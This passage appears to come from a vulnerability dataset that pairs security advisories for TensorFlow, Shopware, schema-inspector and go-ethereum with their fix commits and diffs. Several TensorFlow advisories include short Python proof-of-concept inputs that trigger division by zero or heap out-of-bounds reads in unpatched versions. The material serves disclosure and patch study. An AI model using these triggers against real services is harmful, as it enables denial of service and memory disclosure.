in place to ensure that `indices` is in ascending order, but does not check that `indices` is not empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [532f5c5a547126c634fefd43bbad1dc6417678ac](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac).\n                       \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac","commit_sha":"532f5c5a547126c634fefd43bbad1dc6417678ac","patch":"SINGLE","chain_ord":"['532f5c5a547126c634fefd43bbad1dc6417678ac']","before_first_fix_commit":"{'a4e138660270e7599793fa438cd7b2fc2ce215a6'}","last_fix_commit":"532f5c5a547126c634fefd43bbad1dc6417678ac","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:24:39","message":"Prevent nullptr deref in validation of indexes in map ops.\n\nPiperOrigin-RevId: 387738023\nChange-Id: I83d18d36a7b82ffd2a40b5124a4e5b4c72238f27","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 6, 'total': 15}","files":"{'tensorflow\/core\/kernels\/map_stage_op.cc': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/532f5c5a547126c634fefd43bbad1dc6417678ac\/tensorflow%2Fcore%2Fkernels%2Fmap_stage_op.cc', 'patch': '@@ -210,25 +210,28 @@ class StagingMap : public ResourceBase {\\n                                    const OptionalTuple& tuple)\\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\\n     if (tuple[index].has_value()) {\\n-      return Status(errors::InvalidArgument(\\n+      return errors::InvalidArgument(\\n           \"The tensor for index \\'\", index, \"\\' for key \\'\", key.scalar<int64>()(),\\n-          \"\\' was already initialized \\'\", dtypes_.size(), \"\\'.\"));\\n+          \"\\' was already initialized \\'\", dtypes_.size(), \"\\'.\");\\n     }\\n \\n     return Status::OK();\\n   }\\n \\n   \/\/ Check that the indices are strictly ordered\\n   Status check_index_ordering(const Tensor& indices) {\\n+    if (indices.NumElements() == 0) {\\n+      return errors::InvalidArgument(\"Indices are empty\");\\n+    }\\n+\\n     auto findices = indices.flat<int>();\\n \\n     for (std::size_t i = 0; i < findices.dimension(0) - 1; ++i) {\\n       if (findices(i) < findices(i + 1)) {\\n         continue;\\n       }\\n \\n-      return Status(\\n-          errors::InvalidArgument(\"Indices are not strictly ordered\"));\\n+      return errors::InvalidArgument(\"Indices are not strictly ordered\");\\n     }\\n \\n     return Status::OK();\\n@@ -238,10 +241,10 @@ class StagingMap : public ResourceBase {\\n   Status check_memory_limit(std::size_t bytes)\\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\\n     if (has_memory_limit() && bytes > memory_limit_) {\\n-      return Status(errors::ResourceExhausted(\\n+      return errors::ResourceExhausted(\\n           \"Attempted to insert tensors with combined size of \\'\", bytes,\\n           \"\\' bytes into Staging Area with a memory limit of \\'\", memory_limit_,\\n-          \"\\'.\"));\\n+          \"\\'.\");\\n     }\\n \\n     return Status::OK();'}}","message_norm":"prevent nullptr deref in validation of indexes in map ops.\n\npiperorigin-revid: 387738023\nchange-id: i83d18d36a7b82ffd2a40b5124a4e5b4c72238f27","language":"en","entities":"[('prevent', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('387738023', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/map_stage_op.cc'])","num_files":1.0},{"index":2823,"vuln_id":"GHSA-qw5h-7f53-xrp6","cwe_id":"{'CWE-674'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e07e1c3d26492c06f078c7e5bf2d138043e199c1'}","dataset":"osv","summary":"Stack overflow in `ParseAttrValue` with nested tensors ### Impact\nThe implementation of [`ParseAttrValue`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/c22d88d6ff33031aa113e48aa3fc9aa74ed79595\/tensorflow\/core\/framework\/attr_value_util.cc#L397-L453) can be tricked into stack overflow due to recursion by giving in a specially crafted input.\n\n### Patches\nWe have patched the issue in GitHub commit [e07e1c3d26492c06f078c7e5bf2d138043e199c1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e07e1c3d26492c06f078c7e5bf2d138043e199c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e07e1c3d26492c06f078c7e5bf2d138043e199c1","commit_sha":"e07e1c3d26492c06f078c7e5bf2d138043e199c1","patch":"SINGLE","chain_ord":"['e07e1c3d26492c06f078c7e5bf2d138043e199c1']","before_first_fix_commit":"{'c22d88d6ff33031aa113e48aa3fc9aa74ed79595'}","last_fix_commit":"e07e1c3d26492c06f078c7e5bf2d138043e199c1","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2021, 17:33:00","message":"Prevent memory overflow in ParseAttrValue from nested tensors.\n\nPiperOrigin-RevId: 370108442\nChange-Id: I84d64a5e8895a6aeffbf4749841b4c54d51b5889","author":"Laura Pak","comments":null,"stats":"{'additions': 57, 'deletions': 1, 'total': 58}","files":"{'tensorflow\/core\/framework\/attr_value_util.cc': {'additions': 57, 'deletions': 1, 'changes': 58, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e07e1c3d26492c06f078c7e5bf2d138043e199c1\/tensorflow%2Fcore%2Fframework%2Fattr_value_util.cc', 'patch': '@@ -38,6 +38,9 @@ namespace {\\n \/\/ Do not construct large tensors to compute their hash or compare for equality.\\n constexpr int kMaxAttrValueTensorByteSize = 32 * 1024 * 1024;  \/\/ 32mb\\n \\n+\/\/ Limit nesting of tensors to 100 deep to prevent memory overflow.\\n+constexpr int kMaxTensorNestDepth = 100;\\n+\\n \/\/ Return the size of the tensor represented by this TensorProto. If shape is\\n \/\/ not fully defined return -1.\\n int64 TensorByteSize(const TensorProto& t) {\\n@@ -224,6 +227,54 @@ string SummarizeFunc(const NameAttrList& func) {\\n   return strings::StrCat(func.name(), \"[\", absl::StrJoin(entries, \", \"), \"]\");\\n }\\n \\n+bool ParseAttrValueHelper_TensorNestsUnderLimit(int limit, string to_parse) {\\n+  int nests = 0;\\n+  int maxed_out = to_parse.length();\\n+  int open_curly = to_parse.find(\\'{\\');\\n+  int open_bracket = to_parse.find(\\'<\\');\\n+  int close_curly = to_parse.find(\\'}\\');\\n+  int close_bracket = to_parse.find(\\'>\\');\\n+  if (open_curly == -1) {\\n+    open_curly = maxed_out;\\n+  }\\n+  if (open_bracket == -1) {\\n+    open_bracket = maxed_out;\\n+  }\\n+  int min = std::min(open_curly, open_bracket);\\n+  do {\\n+    if (open_curly == maxed_out && open_bracket == maxed_out) {\\n+      return true;\\n+    }\\n+    if (min == open_curly) {\\n+      nests += 1;\\n+      open_curly = to_parse.find(\\'{\\', open_curly + 1);\\n+      if (open_curly == -1) {\\n+        open_curly = maxed_out;\\n+      }\\n+    } else if (min == open_bracket) {\\n+      nests += 1;\\n+      open_bracket = to_parse.find(\\'<\\', open_bracket + 1);\\n+      if (open_bracket == -1) {\\n+        open_bracket = maxed_out;\\n+      }\\n+    } else if (min == close_curly) {\\n+      nests -= 1;\\n+      close_curly = to_parse.find(\\'}\\', close_curly + 1);\\n+      if (close_curly == -1) {\\n+        close_curly = maxed_out;\\n+      }\\n+    } else if (min == close_bracket) {\\n+      nests -= 1;\\n+      close_bracket = to_parse.find(\\'>\\', close_bracket + 1);\\n+      if (close_bracket == -1) {\\n+        close_bracket = maxed_out;\\n+      }\\n+    }\\n+    min = std::min({open_curly, open_bracket, close_curly, close_bracket});\\n+  } while (nests < 100);\\n+  return false;\\n+}\\n+\\n }  \/\/ namespace\\n \\n string SummarizeAttrValue(const AttrValue& attr_value) {\\n@@ -448,7 +499,12 @@ bool ParseAttrValue(StringPiece type, StringPiece text, AttrValue* out) {\\n   } else {\\n     to_parse = strings::StrCat(field_name, \": \", text);\\n   }\\n-\\n+  if (field_name == \"tensor\") {\\n+    if (!ParseAttrValueHelper_TensorNestsUnderLimit(kMaxTensorNestDepth,\\n+                                                    to_parse)) {\\n+      return false;\\n+    }\\n+  }\\n   return ProtoParseFromString(to_parse, out);\\n }'}}","message_norm":"prevent memory overflow in parseattrvalue from nested tensors.\n\npiperorigin-revid: 370108442\nchange-id: i84d64a5e8895a6aeffbf4749841b4c54d51b5889","language":"en","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('370108442', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/attr_value_util.cc'])","num_files":1.0},{"index":2826,"vuln_id":"GHSA-qwpp-fgrj-h78q","cwe_id":"{'CWE-209', 'CWE-200'}","score":5.3,"chain":"{'https:\/\/github.com\/shopware\/shopware\/commit\/dcb24eb5ec757c991b5a4e2ddced379e5820744d'}","dataset":"osv","summary":"Exposure of Sensitive Information to an Unauthorized Actor Shopware is an open source eCommerce platform. Versions prior to 5.6.10 are vulnerable to system information leakage in error handling. Users are recommend to update to version 5.6.10. You can get the update to 5.6.10 regularly via the Auto-Updater or directly via the download overview.","published_date":"2021-09-08","chain_len":1,"project":"https:\/\/github.com\/shopware\/shopware","commit_href":"https:\/\/github.com\/shopware\/shopware\/commit\/dcb24eb5ec757c991b5a4e2ddced379e5820744d","commit_sha":"dcb24eb5ec757c991b5a4e2ddced379e5820744d","patch":"SINGLE","chain_ord":"['dcb24eb5ec757c991b5a4e2ddced379e5820744d']","before_first_fix_commit":"{'a0d02194b3c255bc28661daa090656aecacf8608'}","last_fix_commit":"dcb24eb5ec757c991b5a4e2ddced379e5820744d","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2021, 13:25:37","message":"SW-26001 - Adjust error controller","author":"Philip Gatzka","comments":null,"stats":"{'additions': 1, 'deletions': 4, 'total': 5}","files":"{'engine\/Shopware\/Controllers\/Frontend\/Error.php': {'additions': 1, 'deletions': 4, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/shopware\/shopware\/raw\/dcb24eb5ec757c991b5a4e2ddced379e5820744d\/engine%2FShopware%2FControllers%2FFrontend%2FError.php', 'patch': \"@@ -50,10 +50,7 @@ public function preDispatch()\\n             $this->enableBackendTheme();\\n         }\\n \\n-        if (strpos($this->Request()->getHeader('Content-Type'), 'application\/json') === 0) {\\n-            $this->Front()->Plugins()->Json()->setRenderer();\\n-            $this->View()->assign('success', false);\\n-        } elseif ($this->Request()->isXmlHttpRequest() || !Shopware()->Container()->initialized('db')) {\\n+        if ($this->Request()->isXmlHttpRequest() || !Shopware()->Container()->initialized('db')) {\\n             $this->View()->loadTemplate($templateModule . '\/error\/exception.tpl');\\n         } elseif (isset($_ENV['SHELL']) || PHP_SAPI === 'cli') {\\n             $this->View()->loadTemplate($templateModule . '\/error\/cli.tpl');\"}}","message_norm":"sw-26001 - adjust error controller","language":"fr","entities":"[('error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['engine\/Shopware\/Controllers\/Frontend\/Error.php'])","num_files":1.0},{"index":2838,"vuln_id":"GHSA-r24h-634p-m72x","cwe_id":"{'CWE-668'}","score":9.8,"chain":"{'https:\/\/github.com\/Atinux\/schema-inspector\/commit\/345a7b2eed11bb6128421150d65f4f83fdbb737d'}","dataset":"osv","summary":"Validation Bypass in schema-inspector In schema-inspector before 1.6.9, a maliciously crafted JavaScript object can bypass the `sanitize()` and the `validate()` function used within schema-inspector.","published_date":"2020-06-10","chain_len":1,"project":"https:\/\/github.com\/Atinux\/schema-inspector","commit_href":"https:\/\/github.com\/Atinux\/schema-inspector\/commit\/345a7b2eed11bb6128421150d65f4f83fdbb737d","commit_sha":"345a7b2eed11bb6128421150d65f4f83fdbb737d","patch":"SINGLE","chain_ord":"['345a7b2eed11bb6128421150d65f4f83fdbb737d']","before_first_fix_commit":"{'7f67b2a95f85ecb76d0dc5326d76d082a2b99e1f'}","last_fix_commit":"345a7b2eed11bb6128421150d65f4f83fdbb737d","chain_ord_pos":1.0,"commit_datetime":"01\/20\/2020, 15:01:42","message":"fix: Issue #75","author":"S\u00e9bastien Chopin","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'lib\/schema-inspector.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/schema-inspector\/schema-inspector\/raw\/345a7b2eed11bb6128421150d65f4f83fdbb737d\/lib%2Fschema-inspector.js', 'patch': \"@@ -80,7 +80,7 @@\\n \\t\\tthis._custom = {};\\n \\t\\tif (custom != null) {\\n \\t\\t\\tfor (var key in custom) {\\n-\\t\\t\\t\\tif (custom.hasOwnProperty(key)){\\n+\\t\\t\\t\\tif (Object.prototype.hasOwnProperty.call(custom, key)) {\\n \\t\\t\\t\\t\\tthis._custom['$' + key] = custom[key];\\n \\t\\t\\t\\t}\\n \\t\\t\\t}\\n@@ -480,7 +480,7 @@\\n \\t\\t\\t}\\n \\t\\t\\telse {\\n \\t\\t\\t\\tfor (var key in candidate) {\\n-\\t\\t\\t\\t\\tif (candidate.hasOwnProperty(key)){\\n+\\t\\t\\t\\t\\tif (Object.prototype.hasOwnProperty.call(candidate, key)) {\\n \\t\\t\\t\\t\\t\\tthis._deeperArray(key);\\n \\t\\t\\t\\t\\t\\tthis._validate(items, candidate[key]);\\n \\t\\t\\t\\t\\t\\tthis._back();\\n@@ -1011,7 +1011,7 @@\\n \\t\\t\\t}\\n \\t\\t\\telse {\\n \\t\\t\\t\\tfor (i in post) {\\n-\\t\\t\\t\\t\\tif(post.hasOwnProperty(i)){\\n+\\t\\t\\t\\t\\tif (Object.prototype.hasOwnProperty.call(post, i)) {\\n \\t\\t\\t\\t\\t\\tthis._deeperArray(i);\\n \\t\\t\\t\\t\\t\\tpost[i] = this._sanitize(schema.items, post[i]);\\n \\t\\t\\t\\t\\t\\tthis._back();\\n@@ -1430,7 +1430,7 @@\\n \\t\\t\\tvar prop = schema.properties || {};\\n \\n \\t\\t\\tfor (var key in prop) {\\n-\\t\\t\\t\\tif (prop.hasOwnProperty(key)){\\n+\\t\\t\\t\\tif (Object.prototype.hasOwnProperty.call(prop, key)) {\\n \\t\\t\\t\\t\\tif (prop[key].optional === true && _rand.bool() === true) {\\n \\t\\t\\t\\t\\t\\tcontinue;\\n \\t\\t\\t\\t\\t}\"}}","message_norm":"fix: issue #75","language":"fr","entities":"[('#75', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/schema-inspector.js'])","num_files":1.0},{"index":2844,"vuln_id":"GHSA-r33q-22hv-j29q","cwe_id":"{'CWE-400'}","score":6.5,"chain":"{'https:\/\/github.com\/ethereum\/go-ethereum\/commit\/bddd103a9f0af27ef533f04e06ea429cf76b6d46'}","dataset":"osv","summary":"Denial of service in github.com\/ethereum\/go-ethereum ### Impact\n\nA DoS vulnerability can make a LES server crash via malicious `GetProofsV2` request from a connected LES client.\n\n### Patches\n\nThe vulnerability was patched in https:\/\/github.com\/ethereum\/go-ethereum\/pull\/21896. \n\n### Workarounds\n\nThis vulnerability only concerns users explicitly enabling `les` server; disabling `les` prevents the exploit. \nIt can also be patched by manually applying the patch in https:\/\/github.com\/ethereum\/go-ethereum\/pull\/21896. \n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https:\/\/github.com\/ethereum\/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/ethereum\/go-ethereum","commit_href":"https:\/\/github.com\/ethereum\/go-ethereum\/commit\/bddd103a9f0af27ef533f04e06ea429cf76b6d46","commit_sha":"bddd103a9f0af27ef533f04e06ea429cf76b6d46","patch":"SINGLE","chain_ord":"['bddd103a9f0af27ef533f04e06ea429cf76b6d46']","before_first_fix_commit":"{'6b5840961407960a06ed20cb5dd1b782080653ff'}","last_fix_commit":"bddd103a9f0af27ef533f04e06ea429cf76b6d46","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2020, 09:55:17","message":"les: fix GetProofsV2 bug (#21896)","author":"Felf\u00f6ldi Zsolt","comments":null,"stats":"{'additions': 2, 'deletions': 4, 'total': 6}","files":"{'les\/server_handler.go': {'additions': 2, 'deletions': 4, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ethereum\/go-ethereum\/raw\/bddd103a9f0af27ef533f04e06ea429cf76b6d46\/les%2Fserver_handler.go', 'patch': '@@ -610,6 +610,7 @@ func (h *serverHandler) handleMsg(p *clientPeer, wg *sync.WaitGroup) error {\\n \\t\\tvar (\\n \\t\\t\\tlastBHash common.Hash\\n \\t\\t\\troot      common.Hash\\n+\\t\\t\\theader    *types.Header\\n \\t\\t)\\n \\t\\treqCnt := len(req.Reqs)\\n \\t\\tif accept(req.ReqID, uint64(reqCnt), MaxProofsFetch) {\\n@@ -624,10 +625,6 @@ func (h *serverHandler) handleMsg(p *clientPeer, wg *sync.WaitGroup) error {\\n \\t\\t\\t\\t\\t\\treturn\\n \\t\\t\\t\\t\\t}\\n \\t\\t\\t\\t\\t\/\/ Look up the root hash belonging to the request\\n-\\t\\t\\t\\t\\tvar (\\n-\\t\\t\\t\\t\\t\\theader *types.Header\\n-\\t\\t\\t\\t\\t\\ttrie   state.Trie\\n-\\t\\t\\t\\t\\t)\\n \\t\\t\\t\\t\\tif request.BHash != lastBHash {\\n \\t\\t\\t\\t\\t\\troot, lastBHash = common.Hash{}, request.BHash\\n \\n@@ -654,6 +651,7 @@ func (h *serverHandler) handleMsg(p *clientPeer, wg *sync.WaitGroup) error {\\n \\t\\t\\t\\t\\t\/\/ Open the account or storage trie for the request\\n \\t\\t\\t\\t\\tstatedb := h.blockchain.StateCache()\\n \\n+\\t\\t\\t\\t\\tvar trie state.Trie\\n \\t\\t\\t\\t\\tswitch len(request.AccKey) {\\n \\t\\t\\t\\t\\tcase 0:\\n \\t\\t\\t\\t\\t\\t\/\/ No account key specified, open an account trie'}}","message_norm":"les: fix getproofsv2 bug (#21896)","language":"af","entities":"[('bug', 'FLAW', ''), ('#21896', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['les\/server_handler.go'])","num_files":1.0},{"index":2845,"vuln_id":"GHSA-r35g-4525-29fq","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1a2a87229d1d61e23a39373777c056161eb4084d'}","dataset":"osv","summary":"Division by 0 in `FusedBatchNorm` ### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n    x=x, scale=scale, offset=offset, mean=mean,\n    variance=variance, epsilon=epsilon,\n    exponential_avg_factor=exponential_avg_factor,\n    data_format=data_format, is_training=is_training)\n``` \n  \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/828f346274841fa7505f7020e88ca36c22e557ab\/tensorflow\/core\/kernels\/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor:\n\n```cc \nconst int depth = x.dimension(3);\nconst int rest_size = size \/ depth;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [1a2a87229d1d61e23a39373777c056161eb4084d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1a2a87229d1d61e23a39373777c056161eb4084d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1a2a87229d1d61e23a39373777c056161eb4084d","commit_sha":"1a2a87229d1d61e23a39373777c056161eb4084d","patch":"SINGLE","chain_ord":"['1a2a87229d1d61e23a39373777c056161eb4084d']","before_first_fix_commit":"{'828f346274841fa7505f7020e88ca36c22e557ab'}","last_fix_commit":"1a2a87229d1d61e23a39373777c056161eb4084d","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 18:30:28","message":"Fix FPE issue with `tf.raw_ops.FusedBatchNorm`.\n\nPiperOrigin-RevId: 370948185\nChange-Id: If0c8e0320062ed6363e94ff5fe38e6a301f69ac2","author":"Amit Patankar","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/fused_batch_norm_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1a2a87229d1d61e23a39373777c056161eb4084d\/tensorflow%2Fcore%2Fkernels%2Ffused_batch_norm_op.cc', 'patch': '@@ -293,6 +293,9 @@ struct FusedBatchNorm<CPUDevice, T, U, \/* is_training= *\/ false> {\\n     const CPUDevice& d = context->eigen_device<CPUDevice>();\\n \\n     const int depth = x.dimension(3);\\n+    OP_REQUIRES(\\n+        context, depth != 0,\\n+        errors::Internal(\"The 4th element in the input shape cannot be 0.\"));\\n     const int size = x.size();\\n     const int rest_size = size \/ depth;\\n     Eigen::DSizes<Eigen::Index, 2> rest_by_depth(rest_size, depth);'}}","message_norm":"fix fpe issue with `tf.raw_ops.fusedbatchnorm`.\n\npiperorigin-revid: 370948185\nchange-id: if0c8e0320062ed6363e94ff5fe38e6a301f69ac2","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('issue', 'FLAW', ''), ('370948185', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fused_batch_norm_op.cc'])","num_files":1.0},{"index":2853,"vuln_id":"GHSA-r4c4-5fpq-56wg","cwe_id":"{'CWE-125'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e84c975313e8e8e38bb2ea118196369c45c51378'}","dataset":"osv","summary":"Heap OOB in boosted trees ### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `BoostedTreesSparseCalculateBestFeatureSplit`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(\n  node_id_range=[0,10],\n  stats_summary_indices=[[1, 2, 3, 0x1000000]],\n  stats_summary_values=[1.0],\n  stats_summary_shape=[1,1,1,1],\n  l1=l2=[1.0],\n  tree_complexity=[0.5],\n  min_node_weight=[1.0],\n  logits_dimension=3,\n  split_type='inequality')                                                                                                                                                                                                                                                                \n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc) needs to validate that each value in `stats_summary_indices` is in range.\n  \n### Patches\nWe have patched the issue in GitHub commit [e84c975313e8e8e38bb2ea118196369c45c51378](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e84c975313e8e8e38bb2ea118196369c45c51378).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e84c975313e8e8e38bb2ea118196369c45c51378","commit_sha":"e84c975313e8e8e38bb2ea118196369c45c51378","patch":"SINGLE","chain_ord":"['e84c975313e8e8e38bb2ea118196369c45c51378']","before_first_fix_commit":"{'2e0ee46f1a47675152d3d865797a18358881d7a6'}","last_fix_commit":"e84c975313e8e8e38bb2ea118196369c45c51378","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 19:35:03","message":"In tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit, limit stat_dim in stats_summary_indices to under stats_dims in stats_summary_shape\n\nPiperOrigin-RevId: 387171191\nChange-Id: I83ca8a75b22aa78c037e8b98779da6cced16bfaa","author":"Laura Pak","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e84c975313e8e8e38bb2ea118196369c45c51378\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fstats_ops.cc', 'patch': '@@ -1050,6 +1050,13 @@ class BoostedTreesSparseCalculateBestFeatureSplitOp : public OpKernel {\\n       const int32_t feature_dim = stats_summary_indices(idx, 1);\\n       const int32_t bucket_id = stats_summary_indices(idx, 2);\\n       const int32_t stat_dim = stats_summary_indices(idx, 3);\\n+      OP_REQUIRES(context, stat_dim < stats_dims,\\n+                  errors::InvalidArgument(\\n+                      \"Stat dim, the sum of logits dim and hessian dim in \"\\n+                      \"stats_summary_indices, cannot be greater than stats \"\\n+                      \"dims, the last value in stats_summary_shape, which was \",\\n+                      stats_dims, \". At index (\", idx,\\n+                      \", 4), stats_summary_indices contains value \", stat_dim));\\n       std::pair<FeatureMapIterator, bool> const& f_insert_result = f_map.insert(\\n           FeatureMapIterator::value_type(feature_dim, BucketMap()));\\n       auto& b_map = f_insert_result.first->second;'}}","message_norm":"in tf.raw_ops.boostedtreessparsecalculatebestfeaturesplit, limit stat_dim in stats_summary_indices to under stats_dims in stats_summary_shape\n\npiperorigin-revid: 387171191\nchange-id: i83ca8a75b22aa78c037e8b98779da6cced16bfaa","language":"en","entities":"[('387171191', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc'])","num_files":1.0},{"index":2855,"vuln_id":"GHSA-r4pj-74mg-8868","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a'}","dataset":"osv","summary":"Division by 0 in `Conv2DBackpropFilter` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding='SAME', explicit_paddings=[],\n                                data_format='NHWC', dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/496c2630e51c1a478f095b084329acedb253db6b\/tensorflow\/core\/kernels\/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and 